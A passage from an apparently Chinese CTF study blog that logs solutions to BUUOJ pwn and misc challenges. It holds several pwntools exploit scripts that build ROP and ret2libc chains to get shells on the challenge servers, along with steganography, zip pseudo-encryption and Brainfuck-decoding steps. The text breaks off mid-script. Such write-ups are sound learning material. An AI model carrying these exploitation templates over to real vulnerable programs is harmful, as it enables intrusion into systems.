class="hljs-type">int</span> rcnt=<span class="hljs-built_in">CountLeaves</span>(T-&gt;rchild);<br>    cnt+=lcnt+rcnt;<br>    <span class="hljs-keyword">return</span> cnt;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BiTree *root;<br>    <span class="hljs-built_in">CreateBiTree</span>(root);<br>    cout&lt;&lt;<span class="hljs-built_in">BiTreeDepth</span>(root)&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>acwing</tag>
      
      <tag>算法学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf做题记录2</title>
    <link href="/2022/04/27/ctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%952/"/>
    <url>/2022/04/27/ctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
    
    <content type="html"><![CDATA[<h1 id="jarvisoj_level2_x64">jarvisoj_level2_x64</h1><figure><img src="https://s2.loli.net/2022/04/14/OTQlVcSKtNMdPZy.png"alt="屏幕截图 2022-04-14 193737" /><figcaption aria-hidden="true">屏幕截图 2022-04-14 193737</figcaption></figure><p>checksec后发现是64位NX_ENABLE的程序，打开ida后发现就是一个简单的64位rop，题目用意应该是让我们熟悉下64位和32位rop构造的区别</p><figure><img src="https://s2.loli.net/2022/04/14/AaHvI6ojXcSw2rU.png"alt="屏幕截图 2022-04-14 193819" /><figcaption aria-hidden="true">屏幕截图 2022-04-14 193819</figcaption></figure><p>在64位中，函数传参通过寄存器，所以可以在函数找到pop_rdi_ret的地址，然后就可以把str_bin_sh传入system函数中</p><figure><img src="https://s2.loli.net/2022/04/14/8RDOc6aQ9xekJtW.png"alt="屏幕截图 2022-04-14 193748" /><figcaption aria-hidden="true">屏幕截图 2022-04-14 193748</figcaption></figure><p>于是exp可以这样构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28168</span>)<br>elf=ELF(<span class="hljs-string">&quot;./level2_x64&quot;</span>)<br>sys_plt=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>pop_rdi_ret=<span class="hljs-number">0x004006b3</span><br>bin_addr=<span class="hljs-number">0x00600A90</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">128</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi_ret)+p64(bin_addr)+p64(sys_plt)<br>a.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>a.send(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="buuoj-not_the_same">buuoj not_the_Same</h1><p>这道题我想简单了，我以为是只要利用gets漏洞将get_Secret的地址传入进去就可以了，没想到get_secret函数就是将flag的内容计入到了fl4g，需要利用write函数或者printf函数，看了wp才解出来，就当作学习了</p><figure><img src="https://s2.loli.net/2022/04/14/2IMp4ozUTSZd6hR.png"alt="屏幕截图 2022-04-14 204035" /><figcaption aria-hidden="true">屏幕截图 2022-04-14 204035</figcaption></figure><p>先checksec一下发现是32位开了NX_ENABLE的程序，不是64位相对写rop简单了点，看主函数发现有gets函数，可以栈溢出，将返回地址改到get_secret函数，然后再用writ函数输出就行了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27886</span>)<br>elf=ELF(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">45</span>+p32(<span class="hljs-number">0x080489E0</span>)+p32(elf.sym[<span class="hljs-string">&quot;write&quot;</span>])+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(<span class="hljs-number">1</span>)+p32(<span class="hljs-number">0x080ECA2D</span>)+p32(<span class="hljs-number">100</span>)<br><span class="hljs-comment">#第一个是get_secret函数的地址，第二个是当get_secret函数结束后的返回地址，第三个是当write函数结束后的返回地址，然后再是write函数参数地址</span><br><span class="hljs-comment">#write函数第一个参数是文件描述符，write默认为1</span><br><span class="hljs-comment">#第二个参数是将要输出的内容的地址</span><br><span class="hljs-comment">#第三个参数是将要输出内容的长度</span><br>a.send(payload)<br>a.interactive()<br><br></code></pre></td></tr></table></figure><p>wp的第二种解法是用printf函数的返回地址来打出fl4g，但是要注意的点是，使用printf来返回flag的值时要返回程序正常结束的地址</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *    <span class="hljs-comment">#导入pwntools中的pwn包的所有内容</span><br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;26732&#x27;</span>)<br>fl4g=<span class="hljs-number">0x080ECA2D</span><br><br>backdoor_addr=<span class="hljs-number">0x80489a0</span><br>printf_addr=<span class="hljs-number">0x0804F0A0</span><br>exi=<span class="hljs-number">0x804E660</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2d</span><br>payload += p32(backdoor_addr)     <span class="hljs-comment">#gets栈溢出ret到get_secret</span><br>payload += p32(printf_addr)       <span class="hljs-comment">#执行完get_secret后的返回地址</span><br>payload += p32(exi)               <span class="hljs-comment">#执行完printf后的返回地址</span><br>payload += p32(fl4g)              <span class="hljs-comment">#printf打印的内容</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="buuoj-ciscn_2019_n_5">buuoj ciscn_2019_n_5</h1><figure><img src="https://s2.loli.net/2022/04/17/k6HaTSrvz2GAQsp.png"alt="屏幕截图 2022-04-17 195444" /><figcaption aria-hidden="true">屏幕截图 2022-04-17 195444</figcaption></figure><p>记得程序里面是puts，有回车所以在接受的时候要recv("?")才行，容易错</p><p>exp:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++">from pwn <span class="hljs-keyword">import</span> *<br>from LibcSearcher <span class="hljs-keyword">import</span> *<br>a=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25155</span>)<br>elf=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;./ciscn_2019_n_5&quot;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>a.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;e&quot;</span>)<br>a.<span class="hljs-built_in">sendline</span>(b<span class="hljs-number">&#x27;1&#x27;</span>)<br>a.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;?\n&quot;</span>)<br>payload1=b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0x00400713</span>)+<span class="hljs-built_in">p64</span>(puts_got)+<span class="hljs-built_in">p64</span>(puts_plt)+<span class="hljs-built_in">p64</span>(main_addr)<br>a.<span class="hljs-built_in">sendline</span>(payload1)<br>puts_addr=<span class="hljs-built_in">u64</span>(a.<span class="hljs-built_in">recv</span>(<span class="hljs-number">7</span>)[:<span class="hljs-number">-1</span>].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libcbase=puts_addr-libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys_addr=libcbase+libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_addr=libcbase+libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>a.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;e&quot;</span>)<br>a.<span class="hljs-built_in">sendline</span>(b<span class="hljs-number">&#x27;1&#x27;</span>)<br>a.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;?\n&quot;</span>)<br>payload2=b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0x004004c9</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0x00400713</span>)+<span class="hljs-built_in">p64</span>(bin_addr)+<span class="hljs-built_in">p64</span>(sys_addr)<br>a.<span class="hljs-built_in">sendline</span>(payload2)<br>a.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h1 id="buuoj-other_shellcode">buuoj other_shellcode</h1><p><strong>图片没上传成功</strong></p><figure><img src="E:\屏幕截图\屏幕截图%202022-04-21%20131917.png"alt="屏幕截图 2022-04-21 131917" /><figcaption aria-hidden="true">屏幕截图 2022-04-21 131917</figcaption></figure><p>看题目发现已经集成好了shellcode，于是只要连接上服务器就可以得到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">09065662</span>-c02a-<span class="hljs-number">44</span>d1-<span class="hljs-number">9</span>d68-<span class="hljs-number">7</span>c29d1144450&#125;<br></code></pre></td></tr></table></figure><h1 id="buuoj-面具下的flag">buuoj 面具下的flag</h1><p>下载题目后发现是图片，先试了下用stegsolve试了下有没有LSB隐写，发现没有。于是又用binwalk开试，发现有藏zip，于是用binwalk提取出来</p><figure><img src="https://s2.loli.net/2022/04/27/XEH3a2RJAms1KLq.png"alt="屏幕截图 2022-04-27 203023" /><figcaption aria-hidden="true">屏幕截图 2022-04-27 203023</figcaption></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">binwalk -e mianju<span class="hljs-selector-class">.jpg</span> <span class="hljs-attr">--root-as</span>=<span class="hljs-built_in">root</span>(因为binwalk需要以root身份运行所以需要加这句)<br></code></pre></td></tr></table></figure><p>提取出来后得到zip文件发现是伪加密（更改尾部的09 00 为0000），用winhex改后可以提出flag.vmdk文件，vmdk文件可以用7z解压出来</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs maxima">zip伪加密方法<br>压缩源文件数据区： <br><br><span class="hljs-number">50</span> 4B <span class="hljs-number">03</span> <span class="hljs-number">04</span>：这是头文件标记（<span class="hljs-number">0x04034b50</span>） <br><span class="hljs-number">14</span> <span class="hljs-number">00</span>：解压文件所需 pkware 版本 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：全局方式位标记（有无加密） <br><span class="hljs-number">08</span> <span class="hljs-number">00</span>：压缩方式 <br>5A 7E：最后修改文件时间 <br>F7 <span class="hljs-number">46</span>：最后修改文件日期 <br><span class="hljs-number">16</span> B5 <span class="hljs-number">80</span> <span class="hljs-number">14</span>：CRC-<span class="hljs-number">32</span>校验（<span class="hljs-number">1480B516</span>） <br><span class="hljs-number">19</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：压缩后尺寸（<span class="hljs-number">25</span>） <br><span class="hljs-number">17</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：未压缩尺寸（<span class="hljs-number">23</span>） <br><span class="hljs-number">07</span> <span class="hljs-number">00</span>：文件名长度 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：扩展记录长度 <br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 <br><br><br>压缩源文件目录区： <br><br><span class="hljs-number">50</span> 4B <span class="hljs-number">01</span> <span class="hljs-number">02</span>：目录中文件文件头标记(<span class="hljs-number">0x02014b50</span>) <br>3F <span class="hljs-number">00</span>：压缩使用的 pkware 版本 <br><span class="hljs-number">14</span> <span class="hljs-number">00</span>：解压文件所需 pkware 版本 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：全局方式位标记（有无加密，这个更改这里进行伪加密，改为<span class="hljs-number">09</span> <span class="hljs-number">00</span>打开就会提示有密码了） <br><span class="hljs-number">08</span> <span class="hljs-number">00</span>：压缩方式 <br>5A 7E：最后修改文件时间 <br>F7 <span class="hljs-number">46</span>：最后修改文件日期 <br><span class="hljs-number">16</span> B5 <span class="hljs-number">80</span> <span class="hljs-number">14</span>：CRC-<span class="hljs-number">32</span>校验（<span class="hljs-number">1480B516</span>） <br><span class="hljs-number">19</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：压缩后尺寸（<span class="hljs-number">25</span>） <br><span class="hljs-number">17</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：未压缩尺寸（<span class="hljs-number">23</span>） <br><span class="hljs-number">07</span> <span class="hljs-number">00</span>：文件名长度 <br><span class="hljs-number">24</span> <span class="hljs-number">00</span>：扩展字段长度 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：文件注释长度 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：磁盘开始号 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：内部文件属性 <br><span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：外部文件属性 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：局部头部偏移量 <br></code></pre></td></tr></table></figure><p>！！！！！</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">7</span>z <span class="hljs-keyword">x</span> flag.vmdk -o./<br></code></pre></td></tr></table></figure><p>提取出来后发现是brainfuck加密</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;<br>++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- --.&lt;+ +++[- &gt;----<br>&lt;]&gt;-- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +++++ .&lt;+++ +[-&gt;- ---&lt;] &gt;-.&lt;+ +++++ [-&gt;++<br>++++&lt; ]&gt;+++ +++.&lt; +++++ [-&gt;-- ---&lt;] &gt;---- -.+++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. <br></code></pre></td></tr></table></figure><p>使用<ahref="https://www.splitbrain.org/services/ook">brainfuck在线解密</a>网站就可以得到flag：flag{N7F5_AD5_i5_funny!}</p><h1 id="buuoj-荷兰宽带泄露-被偷走的文件-秘密文件">buuoj 荷兰宽带泄露被偷走的文件 秘密文件</h1><h1 id="被刷新的文件">被刷新的文件</h1><h1 id="buuoj-2018_rop">buuoj 2018_rop</h1><p>checksec后发现是32位开启了NX的程序，于是打开ida分析</p><p><img src="https://s2.loli.net/2022/04/29/Go1AmIDPSZXC6VB.png"alt="屏幕截图 2022-04-29 221100" /><imgsrc="https://s2.loli.net/2022/04/29/vHigWhpko6eTLJY.png"alt="屏幕截图 2022-04-29 221051" /></p><p>典型的ret2libc，于是可以构造payload,同时再巩固下libc模板中的关键位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28791</span>)<br>elf=ELF(<span class="hljs-string">&quot;./2018_rop&quot;</span>)<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr=<span class="hljs-number">0x080484C6</span><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#32位程序：先是write函数的地址 + 预留返回地址 + write函数的三个参数 （1 + write函数的真正地址（got表内的地址） + 打印的字节）</span><br><br>a.send(payload1)<br>write_addr=u32(a.recv())<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<br>libcbase=write_addr-libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<br>sys_addr=libcbase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>bin_sh=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(sys_addr)+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(bin_sh)<br>a.send(payload2)<br>a.interactive()<br></code></pre></td></tr></table></figure><h2id="补充下retlibc2模板中的关键部分payload构造">补充下retlibc2模板中的关键部分payload构造</h2><p>32位：</p><p>​ write函数有三个参数，所以构造payload应该为：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">先是<span class="hljs-built_in">write</span>函数的地址 + 预留返回地址 + <span class="hljs-built_in">write</span>函数的三个参数 （<span class="hljs-number">1</span> + <span class="hljs-built_in">write</span>函数的真正地址（got表内的地址） + 打印的字节）<br></code></pre></td></tr></table></figure><p>64位：</p><ol type="1"><li>与32的区别是64位通过寄存器传入参数，同时先传参，所以构造以write为泄露地址的payload应该为</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">偏移量 + <span class="hljs-built_in">rdi</span>寄存器 + 第一个参数 + <span class="hljs-built_in">rsi</span>寄存器 + 第二个参数 + <span class="hljs-built_in">rdx</span>寄存器 + 第三个参数 + <span class="hljs-built_in">rdx</span>寄存器+write函数的地址 + 预留返回地址<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li><p>如果是puts函数只需要一个参数即可（也就是只需要传入rdi一个寄存器）</p></li><li><p>同时64位在接受时尽量采用</p></li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">write_addr = <span class="hljs-built_in">u64</span>(r<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;x7f&quot;</span>)<span class="hljs-selector-attr">[-6:]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;x00&quot;</span>))<br></code></pre></td></tr></table></figure><p>​因为64位的地址都是7f开头的，如果是用recv(8)的话就会截取前八个字节，而在7f之前还有另外的输出，就会造成错误，而用的是第一种取7f之前的就不会出错，所以以后尽量用第一种，不容易出错。你当然可以用debug调试查看一下。</p><h1 id="bjdctf_2020_babyrop">bjdctf_2020_babyrop</h1><p>checksec后发现是64位未开启NX的程序，大概猜测是ret2libc</p><p>打开程序看后发现确实是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Pull up your sword and tell me u story!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64</span>uLL);<br>&#125;<br></code></pre></td></tr></table></figure><p>于是可以构造ex</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25906</span>)<br>elf=ELF(<span class="hljs-string">&quot;./bjdctf_2020_babyrop&quot;</span>)<br>puts_plt=elf.plt[<span 